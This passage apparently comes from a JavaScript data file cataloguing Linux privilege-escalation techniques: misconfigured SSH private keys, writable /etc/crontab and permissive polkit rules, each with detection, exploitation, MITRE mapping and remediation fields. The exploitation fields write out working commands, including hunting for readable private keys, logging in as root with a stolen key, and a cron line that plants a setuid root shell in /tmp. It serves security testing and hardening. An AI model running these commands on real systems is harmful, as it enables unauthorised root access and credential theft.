    {
      name: "Exploiting Misconfigured SSH Keys",
      os: "Linux",
      category: "Credential Access",
      description: "If a user can read another user's SSH private key (due to misconfigured permissions on .ssh directory or key files), they can authenticate as that user. Root's SSH key provides full system access.",
      detection: "find / -name id_rsa -o -name id_ed25519 -o -name id_ecdsa 2>/dev/null — find SSH private keys. Check permissions: should be 600 for keys, 700 for .ssh directory.",
      exploitation: "find / -name 'authorized_keys' -readable 2>/dev/null — find readable authorized_keys. find / -name 'id_rsa' -readable 2>/dev/null — find readable private keys. ssh -i /path/to/stolen/id_rsa root@localhost.",
      command: "find / -name id_rsa -o -name id_ed25519 2>/dev/null | xargs ls -la 2>/dev/null",
      mitre: "T1552.004 - Private Keys",
      tools: ["find", "ssh", "LinPEAS"],
      remediation: "Set SSH key permissions: chmod 600 ~/.ssh/id_rsa, chmod 700 ~/.ssh. Disable root SSH login. Use key passphrases. Regularly audit SSH key files."
    },
    {
      name: "Exploiting Weak File Permissions on /etc/crontab",
      os: "Linux",
      category: "File Permission",
      description: "If /etc/crontab or files in /etc/cron.d/ are writable by non-root users, arbitrary cron jobs can be added that execute as root. This provides both privilege escalation and persistence.",
      detection: "ls -la /etc/crontab /etc/cron.d/ — check write permissions. auditd rule: -w /etc/crontab -p wa -k cron_modification.",
      exploitation: "echo '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/crontab — adds cron job running every minute as root. Wait 1 minute, then: /tmp/rootbash -p.",
      command: "ls -la /etc/crontab /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/",
      mitre: "T1053.003 - Cron",
      tools: ["LinPEAS"],
      remediation: "Set /etc/crontab to 644 root:root. Set /etc/cron.d/ to 755 root:root. Monitor for unauthorized modifications."
    },
    {
      name: "Abusing Polkit (pkexec) Rules",
      os: "Linux",
      category: "Polkit Abuse",
      description: "Polkit rules (.rules files in /etc/polkit-1/rules.d or /usr/share/polkit-1/rules.d) define who can perform privileged actions. Misconfigured rules may allow unprivileged users to execute actions as root. Additionally, some polkit versions have bypass vulnerabilities.",
      detection: "cat /etc/polkit-1/rules.d/*.rules — review polkit rules for overly permissive configurations. pkaction --verbose — list all polkit actions and their authorization requirements.",
      exploitation: "If a rule allows the current user to run a privileged action: pkexec <action>. Check for rules with auth_self (password) vs auth_admin (admin password) vs yes (no auth needed).",
      command: "find /etc/polkit-1 /usr/share/polkit-1 -name '*.rules' 2>/dev/null | xargs cat 2>/dev/null",
      mitre: "T1548 - Abuse Elevation Control Mechanism",
      tools: ["pkexec", "pkaction", "LinPEAS"],
      remediation: "Review and restrict polkit rules. Use auth_admin_keep for sensitive actions. Don't use 'yes' authorization for privileged operations. Keep polkit updated."
    }
  ]
};
